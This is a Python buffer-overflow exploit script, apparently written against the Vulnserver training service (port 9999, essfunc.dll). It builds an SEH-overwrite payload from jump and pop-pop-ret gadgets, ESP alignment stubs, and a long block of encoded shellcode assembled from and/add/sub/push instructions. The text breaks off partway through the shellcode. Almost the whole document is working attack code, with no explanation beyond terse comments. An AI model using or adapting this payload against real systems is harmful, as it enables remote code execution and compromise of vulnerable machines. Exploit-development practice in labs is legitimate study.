#!/usr/bin/python

import socket
import os
import sys

host = "192.168.177.138"
port = 9999

nseh = b"\x74\x06\x75\x04" # jmp over SEH
seh = b"\x0b\x12\x50\x62" # pop pop ret, 6250120b essfunc.dll


alignEsp = b"\x54\x58\x66\x05\x58\x13\x50\x5C" ## align ESP to bottom of D buffer

### jmp 80, into A buffer
d_jmp = b"\x53" ## push ebx
d_jmp += b"\x58" ## pop eax
d_jmp += b"\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
d_jmp += b"\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
d_jmp += b"\x50"                 ## push eax

### Aligh ESP to bottom of A buffer, after d_jmp
esp_a = b"\x54\x58\x2C\x35\x50\x5C"

### move to top of A buffer using Call EBX
a_jmp = b"\x54\x5B"
a_jmp += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
a_jmp += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
a_jmp += b"\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
a_jmp += b"\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
a_jmp += b"\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
a_jmp += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
a_jmp += b"\x50"                 ## push eax
a_jmp += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
a_jmp += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
a_jmp += b"\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
a_jmp += b"\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
a_jmp += b"\x50"                 ## push eax

#
esp_shell = b"\x54\x58\x2C\x3F\x50\x5C" ## align ESP to bottom of A buffer, right before

shell = b""
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x61\x30\x50\x50" ## add  eax, 0x50503061
shell += b"\x05\x60\x30\x40\x40" ## add  eax, 0x40403060
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x50\x10\x23\x75" ## add  eax, 0x75231050
shell += b"\x05\x50\x10\x22\x75" ## add  eax, 0x75221050
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x57\x33\x21\x23" ## add  eax, 0x23213357
shell += b"\x05\x46\x22\x12\x23" ## add  eax, 0x23122246
shell += b"\x05\x45\x22\x21\x22" ## add  eax, 0x22212245
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x72\x61\x64\x22" ## add  eax, 0x22646172
shell += b"\x05\x71\x61\x64\x22" ## add  eax, 0x22646171
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x12\x75\x65\x21" ## add  eax, 0x21657512
shell += b"\x05\x02\x65\x54\x20" ## add  eax, 0x20546502
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x75\x35\x06\x64" ## add  eax, 0x64063575
shell += b"\x05\x74\x24\x05\x54" ## add  eax, 0x54052474
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x32\x53\x76\x35" ## add  eax, 0x35765332
shell += b"\x05\x32\x53\x66\x45" ## add  eax, 0x45665332
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x66\x77\x13\x23" ## add  eax, 0x23137766
shell += b"\x05\x55\x66\x13\x13" ## add  eax, 0x13136655
shell += b"\x05\x63\x55\x12\x23" ## add  eax, 0x23125563
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x66\x63\x14\x17" ## add  eax, 0x17146366
shell += b"\x05\x65\x53\x13\x16" ## add  eax, 0x16135365
shell += b"\x05\x43\x32\x13\x15" ## add  eax, 0x15133243
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x26\x25\x66\x45" ## add  eax, 0x45662526
shell += b"\x05\x15\x25\x66\x45" ## add  eax, 0x45662515
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x56\x67\x62\x33" ## add  eax, 0x33626756
shell += b"\x05\x55\x56\x51\x23" ## add  eax, 0x23515655
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x72\x76\x46\x34" ## add  eax, 0x34467672
shell += b"\x05\x61\x65\x45\x34" ## add  eax, 0x34456561
shell += b"\x05\x52\x53\x34\x24" ## add  eax, 0x24345352
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x53\x07\x30\x74" ## add  eax, 0x74300753
shell += b"\x05\x43\x06\x30\x74" ## add  eax, 0x74300643
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x32\x45\x13\x73" ## add  eax, 0x73134532
shell += b"\x05\x22\x45\x03\x74" ## add  eax, 0x74034522
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x73\x62\x37\x17" ## add  eax, 0x17376273
shell += b"\x05\x74\x61\x47\x07" ## add  eax, 0x07476174
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x06\x31\x42\x23" ## add  eax, 0x23423106
shell += b"\x05\x06\x30\x42\x24" ## add  eax, 0x24423006
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x35\x63\x15\x71" ## add  eax, 0x71156335
shell += b"\x05\x24\x54\x15\x70" ## add  eax, 0x70155424
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x31\x76\x37\x17" ## add  eax, 0x17377631
shell += b"\x05\x20\x75\x47\x16" ## add  eax, 0x16477520
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x73\x66\x36\x72" ## add  eax, 0x72366673
shell += b"\x05\x72\x66\x36\x61" ## add  eax, 0x61366672
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x12\x61\x37\x17" ## add  eax, 0x17376112
shell += b"\x05\x02\x60\x36\x07" ## add  eax, 0x07366002
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x20\x73\x53\x61" ## add  eax, 0x61537320
shell += b"\x05\x20\x73\x52\x60" ## add  eax, 0x60527320
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x63\x37\x64\x26" ## add  eax, 0x26643763
shell += b"\x05\x63\x26\x53\x25" ## add  eax, 0x25532663
shell += b"\x05\x43\x25\x33\x23" ## add  eax, 0x23332543
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x73\x23\x71\x43" ## add  eax, 0x43712373
shell += b"\x05\x74\x12\x60\x42" ## add  eax, 0x42601274
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x76\x44\x43\x61" ## add  eax, 0x61434476
shell += b"\x05\x65\x44\x43\x51" ## add  eax, 0x51434465
shell += b"\x05\x53\x44\x33\x41" ## add  eax, 0x41334453
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x34\x72\x43\x43" ## add  eax, 0x43437234
shell += b"\x05\x34\x61\x33\x43" ## add  eax, 0x43336134
shell += b"\x05\x33\x52\x33\x32" ## add  eax, 0x32335233
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x33\x62\x77\x75" ## add  eax, 0x75776233
shell += b"\x05\x24\x62\x67\x64" ## add  eax, 0x64676224
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x53\x45\x36\x27" ## add  eax, 0x27364553
shell += b"\x05\x43\x44\x46\x27" ## add  eax, 0x27464443
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x36\x76\x36\x44" ## add  eax, 0x44367636
shell += b"\x05\x35\x65\x35\x44" ## add  eax, 0x44356535
shell += b"\x05\x26\x54\x36\x44" ## add  eax, 0x44365426
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x63\x67\x44\x64" ## add  eax, 0x64446763
shell += b"\x05\x63\x56\x44\x63" ## add  eax, 0x63445663
shell += b"\x05\x42\x45\x34\x43" ## add  eax, 0x43344542
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x04\x71\x76\x72" ## add  eax, 0x72767104
shell += b"\x05\x04\x60\x76\x62" ## add  eax, 0x62766004
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x50\x24\x13\x13" ## add  eax, 0x13132450
shell += b"\x05\x40\x24\x03\x12" ## add  eax, 0x12032440
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x37\x17\x67\x44" ## add  eax, 0x44671737
shell += b"\x05\x47\x06\x56\x44" ## add  eax, 0x44560647
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x23\x50\x36\x70" ## add  eax, 0x70365023
shell += b"\x05\x12\x40\x25\x70" ## add  eax, 0x70254012
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x17\x37\x16\x57" ## add  eax, 0x57163717
shell += b"\x05\x06\x36\x05\x47" ## add  eax, 0x47053606
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x47\x37\x57\x16" ## add  eax, 0x16573747
shell += b"\x05\x47\x47\x57\x15" ## add  eax, 0x15574747
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x73\x72\x32\x64" ## add  eax, 0x64327273
shell += b"\x05\x72\x61\x21\x54" ## add  eax, 0x54216172
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x65\x51\x14\x31" ## add  eax, 0x31145165
shell += b"\x05\x55\x51\x14\x21" ## add  eax, 0x21145155
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x65\x65\x11\x37" ## add  eax, 0x37116565
shell += b"\x05\x64\x65\x11\x26" ## add  eax, 0x26116564
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x13\x35\x31\x57" ## add  eax, 0x57313513
shell += b"\x05\x03\x34\x41\x46" ## add  eax, 0x46413403
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x62\x53\x11\x21" ## add  eax, 0x21115362
shell += b"\x05\x61\x52\x11\x10" ## add  eax, 0x10115261
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x65\x17\x71\x47" ## add  eax, 0x47711765
shell += b"\x05\x55\x16\x61\x46" ## add  eax, 0x46611655
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x77\x37\x64\x12" ## add  eax, 0x12643777
shell += b"\x05\x77\x46\x54\x12" ## add  eax, 0x12544677
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x67\x37\x51\x77" ## add  eax, 0x77513767
shell += b"\x05\x66\x46\x40\x67" ## add  eax, 0x67404666
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x63\x64\x76\x21" ## add  eax, 0x21766463
shell += b"\x05\x63\x54\x66\x11" ## add  eax, 0x11665463
shell += b"\x05\x43\x33\x54\x21" ## add  eax, 0x21543343
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x16\x16\x75\x67" ## add  eax, 0x67751616
shell += b"\x05\x26\x25\x64\x66" ## add  eax, 0x66642526
shell += b"\x05\x14\x16\x54\x45" ## add  eax, 0x45541614
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x61\x53\x36\x32" ## add  eax, 0x32365361
shell += b"\x05\x51\x52\x36\x21" ## add  eax, 0x21365251
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x43\x42\x17\x31" ## add  eax, 0x31174243
shell += b"\x05\x43\x41\x26\x32" ## add  eax, 0x32264143
shell += b"\x05\x42\x42\x15\x31" ## add  eax, 0x31154242
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x31\x47\x47\x41" ## add  eax, 0x41474731
shell += b"\x05\x31\x46\x46\x41" ## add  eax, 0x41464631
shell += b"\x05\x21\x45\x45\x41" ## add  eax, 0x41454521
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x12\x62\x66\x73" ## add  eax, 0x73666212
shell += b"\x05\x12\x51\x55\x62" ## add  eax, 0x62555112
shell += b"\x05\x12\x62\x34\x52" ## add  eax, 0x52346212
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x35\x23\x63\x75" ## add  eax, 0x75632335
shell += b"\x05\x25\x23\x54\x64" ## add  eax, 0x64542325
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x73\x23\x54\x41" ## add  eax, 0x41542373
shell += b"\x05\x62\x23\x43\x32" ## add  eax, 0x32432362
shell += b"\x05\x52\x23\x43\x31" ## add  eax, 0x31432352
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x27\x14\x76\x46" ## add  eax, 0x46761427
shell += b"\x05\x16\x23\x65\x45" ## add  eax, 0x45652316
shell += b"\x05\x25\x13\x56\x33" ## add  eax, 0x33561325
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x36\x20\x75\x67" ## add  eax, 0x67752036
shell += b"\x05\x35\x10\x65\x67" ## add  eax, 0x67651035
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x66\x46\x73\x33" ## add  eax, 0x33734666
shell += b"\x05\x65\x46\x62\x23" ## add  eax, 0x23624665
shell += b"\x05\x46\x34\x52\x23" ## add  eax, 0x23523446
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x67\x34\x47\x25" ## add  eax, 0x25473467
shell += b"\x05\x66\x34\x36\x24" ## add  eax, 0x24363466
shell += b"\x05\x45\x23\x35\x24" ## add  eax, 0x24352345
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x11\x05\x13\x13" ## add  eax, 0x13130511
shell += b"\x05\x01\x05\x04\x02" ## add  eax, 0x02040501
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x67\x26\x36\x15" ## add  eax, 0x15362667
shell += b"\x05\x57\x26\x26\x04" ## add  eax, 0x04262657
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x23\x75\x30\x73" ## add  eax, 0x73307523
shell += b"\x05\x12\x75\x40\x74" ## add  eax, 0x74407512
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x64\x36\x32\x27" ## add  eax, 0x27323664
shell += b"\x05\x54\x35\x31\x26" ## add  eax, 0x26313554
shell += b"\x05\x64\x26\x32\x25" ## add  eax, 0x25322664
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x32\x23\x53\x27" ## add  eax, 0x27532332
shell += b"\x05\x22\x22\x42\x16" ## add  eax, 0x16422222
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x56\x17\x36\x27" ## add  eax, 0x27361756
shell += b"\x05\x55\x17\x25\x16" ## add  eax, 0x16251755
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x34\x26\x15\x75" ## add  eax, 0x75152634
shell += b"\x05\x34\x15\x24\x64" ## add  eax, 0x64241534
shell += b"\x05\x23\x26\x14\x54" ## add  eax, 0x54142623
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x50\x40\x72\x23" ## add  eax, 0x23724050
shell += b"\x05\x40\x40\x61\x12" ## add  eax, 0x12614040
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x65\x46\x71\x76" ## add  eax, 0x76714665
shell += b"\x05\x64\x35\x62\x65" ## add  eax, 0x65623564
shell += b"\x05\x44\x36\x51\x53" ## add  eax, 0x53513644
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x66\x54\x45\x17" ## add  eax, 0x17455466
shell += b"\x05\x65\x43\x34\x16" ## add  eax, 0x16344365
shell += b"\x05\x46\x43\x34\x15" ## add  eax, 0x15344346
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x51\x77\x30\x65" ## add  eax, 0x65307751
shell += b"\x05\x51\x76\x30\x65" ## add  eax, 0x65307651
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x76\x26\x31\x13" ## add  eax, 0x13312676
shell += b"\x05\x65\x16\x22\x13" ## add  eax, 0x13221665
shell += b"\x05\x53\x24\x21\x12" ## add  eax, 0x12212453
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x74\x76\x66\x16" ## add  eax, 0x16667674
shell += b"\x05\x64\x65\x55\x16" ## add  eax, 0x16556564
shell += b"\x05\x54\x54\x46\x14" ## add  eax, 0x14465454
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x72\x32\x15\x62" ## add  eax, 0x62153272
shell += b"\x05\x62\x42\x14\x52" ## add  eax, 0x52144262
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x54\x52\x41\x73" ## add  eax, 0x73415254
shell += b"\x05\x44\x52\x41\x73" ## add  eax, 0x73415244
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x62\x71\x12\x31" ## add  eax, 0x31127162
shell += b"\x05\x61\x62\x21\x22" ## add  eax, 0x22216261
shell += b"\x05\x42\x51\x12\x21" ## add  eax, 0x21125142
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x57\x74\x26\x44" ## add  eax, 0x44267457
shell += b"\x05\x46\x64\x25\x44" ## add  eax, 0x44256446
shell += b"\x05\x45\x53\x26\x33" ## add  eax, 0x33265345
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x36\x63\x27\x37" ## add  eax, 0x37276336
shell += b"\x05\x35\x53\x26\x26" ## add  eax, 0x26265335
shell += b"\x05\x24\x62\x25\x25" ## add  eax, 0x25256224
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x16\x61\x67\x36" ## add  eax, 0x36676116
